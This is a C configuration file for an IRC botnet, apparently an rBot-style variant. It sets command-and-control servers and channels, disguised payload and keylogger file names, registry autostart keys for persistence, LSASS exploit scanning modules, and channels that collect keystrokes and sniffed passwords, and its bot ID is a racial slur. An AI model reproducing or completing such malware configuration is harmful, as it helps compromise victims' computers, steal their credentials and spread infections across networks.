int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 1192;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 1912;				// Port # for tftp daemon to run on
int httpport = 1826;			// Port # for http daemon to run on
int rloginport = 3232;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 4;				// how many random numbers in the nick
int nicktype = COUNTRYNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\sys.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "4492";			// cftp port ".lsaport 6969"
char lsuser[] = "dide";
char lspass[] = "eded";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"lsass_445", true},
{"ls1ls", true},
{"msass", true},
{NULL, false}
};

//
BOOL sp2_mod = TRUE;				// sp2mod
char botid[] = "NIgger";						// bot id
char version[] = "nzm v0.8  | beta modded by ^|^-[i]-[]V[]";		// Bots !version reply
char password[] = "PASSWORD";					// bot password
char server[] = "Irc.nicro.com";		// server
char serverpass[] = "";						// server password
char channel[] = "#bots";				// channel that the bot should join
char chanpass[] = "password";						// channel password
char server2[] = "irc.nicro.net";						// backup server (optional)
char channel2[] = "#bots";						// backup channel (optional)
char chanpass2[] = "password";						// backup channel password (optional)
char filename[] = "WindowANTasdIVRI.exe";			// destination file name *** your payload should match this too ***
char keylogfile[] = "Windllfdgfasddgcheckkk.dll";				// keylog filename
char valuename[] = "Windowfdgfds DasdLL fgfdg Verifier";		// value name for autostart
char nickconst[] = "[msn]-";					// first part to the bot's nick
char szLocalPayloadFile[]="Winasddowsdllcheckkk.exe";	// **** make this the same as your bot filename! ****
char modeonconn[] = "-xt";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#bots";					// Channel where exploit messages get redirected
char keylogchan[] = "#bots";						// Channel where keylog messages get redirected
char psniffchan[] = "#asd";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@*HOST>com"
};

char *versionlist[] = {
	"roffer v1.2b24 [20031215140650], http://iroffer.org/",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
